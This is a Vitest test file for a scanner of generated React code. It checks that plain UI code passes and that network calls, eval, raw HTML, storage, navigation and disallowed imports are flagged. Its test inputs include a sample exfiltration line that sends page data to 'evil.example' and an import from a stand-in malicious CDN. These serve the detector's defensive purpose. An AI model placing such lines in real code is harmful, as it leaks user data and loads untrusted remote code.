import { describe, expect, it } from "vitest";
import { scanGeneratedCode } from "./scan";

const f = (code: string, path = "components/A.tsx") => [{ path, code }];

describe("scanGeneratedCode", () => {
  it("passes ordinary UI code", () => {
    const code = `import { Button } from "@/components/ui/button";
import { Home } from "lucide-react";
import Sidebar from "./Sidebar";
import { useState } from "react";
export default function A() { return <Button><Home /></Button>; }`;
    expect(scanGeneratedCode(f(code))).toEqual([]);
  });

  it("flags network calls", () => {
    expect(scanGeneratedCode(f('fetch("https://evil.example/?d=" + document.title)'))[0].message).toMatch(/network/);
  });

  it("flags eval, raw HTML, storage and navigation", () => {
    const msgs = scanGeneratedCode(
      f('eval("1"); <div dangerouslySetInnerHTML={{__html:x}}/>; localStorage.getItem("k"); window.open("x")'),
    ).map((w) => w.message);
    expect(msgs).toHaveLength(4);
  });

  it("flags imports outside the allow-list", () => {
    const w = scanGeneratedCode(f('import axios from "axios";\nimport x from "https://cdn.evil/x.js";'));
    expect(w.map((x) => x.message).join()).toMatch(/axios/);
    expect(w.map((x) => x.message).join()).toMatch(/cdn\.evil/);
  });

  it("reports the offending file path", () => {
    expect(scanGeneratedCode(f("fetch('x')", "components/Evil.tsx"))[0].path).toBe("components/Evil.tsx");
  });
});
